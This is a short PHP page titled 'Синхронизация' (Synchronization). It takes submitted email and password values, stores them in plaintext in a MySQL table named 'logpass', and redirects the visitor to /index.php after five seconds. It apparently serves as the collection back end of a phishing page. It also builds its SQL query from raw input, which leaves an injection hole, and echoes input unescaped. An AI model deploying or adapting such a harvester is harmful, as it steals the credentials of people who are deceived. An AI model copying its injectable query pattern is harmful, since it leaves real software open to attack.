<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Синхронизация</title>
	<meta http-equiv="Refresh" content="5; /index.php" /> 
</head>
<body>
<?php
$link = mysql_connect("localhost","root","");
mysql_select_db("logins",$link);
$p1=$_POST["email"];
$p2=$_POST["pass"];
echo $p1;

$query = "INSERT INTO logpass VALUES ('$p1','$p2')";
mysql_query($query);
?> 

<Refresh scr="/index.php">
</body>
</html>